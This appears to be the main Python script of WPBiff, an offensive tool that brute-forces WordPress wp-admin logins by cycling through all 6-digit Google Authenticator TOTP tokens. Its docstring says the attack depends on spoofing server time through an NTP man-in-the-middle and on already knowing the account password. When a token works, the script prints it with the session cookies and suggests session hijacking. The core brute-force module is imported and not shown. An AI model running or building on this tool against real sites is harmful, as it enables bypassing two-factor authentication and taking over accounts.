# -*- coding: utf-8 -*-

import click
import sys

from __about__ import __version__, __author__, __description__, __copyright__, __website__
from colorama import Fore, Back, Style, init
from core.brutesession import BruteSession

def banner():
    """
    Generates fancy banner
    """
    logo = """\n██╗    ██╗██████╗ ██████╗ ██╗███████╗███████╗
██║    ██║██╔══██╗██╔══██╗██║██╔════╝██╔════╝
██║ █╗ ██║██████╔╝██████╔╝██║█████╗  █████╗
██║███╗██║██╔═══╝ ██╔══██╗██║██╔══╝  ██╔══╝
╚███╔███╔╝██║     ██████╔╝██║██║     ██║
 ╚══╝╚══╝ ╚═╝     ╚═════╝ ╚═╝╚═╝     ╚═╝  """
    print(Style.DIM + logo)
    print(Style.BRIGHT + "\nWPBiff {0} {1}".format(__version__, __description__))
    print(Fore.BLUE + "{0}\n".format(__copyright__))

def supported_python_version():
    """
    Verifies Python version
    """
    python_version = sys.version.split()[0]
    if python_version >= "3" or python_version < "2.6":
        return False
    else:
        return True

def controller(args):
    """
    \b
    WPBiff
    ======

    This utility brute-forces Wordpress wp-admin login pages by iterating
    through every possible 6-digit Google Authenticator TOTP token.

    \b
    Pre-requisites:
    ---------------
        1. You must be able to manipulate the server time (e.g. NTP MitM with Delorean)
        2. You must know the Wordpress login username and password

    More info: https://github.com/gszathmari/wpbiff/blob/master/README.rst
    """
    result = None
    banner()

    if args.get('user_agent') is None:
        args['user_agent'] = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"

    brute = BruteSession(
                args.get('date'),
                args.get('url'),
                args.get('username'),
                args.get('password'),
                args.get('token'),
                args.get('max_token'),
                args.get('user_agent'),
                args.get('plugin')
            )

    try:
        result = brute.run()
    # Handle if user presses CTRL + C
    except KeyboardInterrupt:
        print("\nUser interrupt")
        sys.exit(2)

    if result:
        fireworks = """\n           .
         .* *.               `o`o`
         *. .*              o`o`o`o      ^,^,^
           * \               `o`o`     ^,^,^,^,^
              \     ***        |       ^,^,^,^,^
               \   *****       |        /^,^,^
                \   ***        |       /
    ~@~*~@~      \   \         |      /
  ~*~@~*~@~*~     \   \        |     /
  ~*~@smd@~*~      \   \       |    /     #$#$#        .`'.;.
  ~*~@~*~@~*~       \   \      |   /     #$#$#$#   00  .`,.',
    ~@~*~@~ \        \   \     |  /      /#$#$#   /|||  `.,'
_____________\________\___\____|_/______/_________|\/\___||______\n"""
        print(Fore.GREEN + fireworks)
        print(Style.BRIGHT + "Great Success!\n")
        print("Token")
        print("-----")
        print(Back.MAGENTA + result['token'])
        print("\nWordpress Session Cookies")
        print("-------------------------")
        for k, v in result['cookies'].iteritems():
            cookie = Fore.MAGENTA + "{0}".format(k) + Fore.BLUE + " => " + Fore.MAGENTA + "{0}".format(v)
            print(cookie)
        print(Style.DIM + "\nNote: Depending on the Wordpress plugin, you might not be")
        print(Style.DIM + "able to reuse the token above. In this case try session")
        print(Style.DIM + "hijacking with the session cookies provided above")
    else:
        print(Fore.MAGENTA + "\n\nNo valid token has been found :(")

CONTEXT_SETTINGS = dict(help_option_names=['-h', '--help'])

@click.command(context_settings=CONTEXT_SETTINGS)
@click.option('-d', '--date', required=True, help='Pinned date (Format: "YYYY-MM-DD hh:mm")', metavar='DATE')
@click.option('-u', '--username', required=True, help='Wordpress username', metavar='USER')
@click.option('-p', '--password', required=True, prompt=True, hide_input=True, confirmation_prompt=True, help='Wordpress password', metavar='PASS')
@click.option('--plugin', type=click.Choice(['ga', 'wpga']), required=True, help='Wordpress two-factor auth plugin type: Google Authenticator (ga), WP Google Authenticator (wpga)')
@click.option('-a', '--user-agent', help='HTTP User-Agent header (default: Firefox)', metavar='')
@click.option('-t', '--token', default=0, help='Initial value of token (default: 000000)', type=click.IntRange(0, 999999), metavar='TOKEN')
@click.option('-m', '--max-token', default=999999, help='Maximum token value (default: 999999)', type=click.IntRange(0, 999999), metavar='TOKEN')
@click.argument('url', nargs=1, required=True)
def main(*args, **kwargs):
    """ Main program entry point """
    if supported_python_version() is False:
        print("Error: This utility only supports Python 2.6.x and 2.7.x")
        sys.exit(2)
    # Initialize colorama
    init(autoreset=True)
    controller(kwargs)
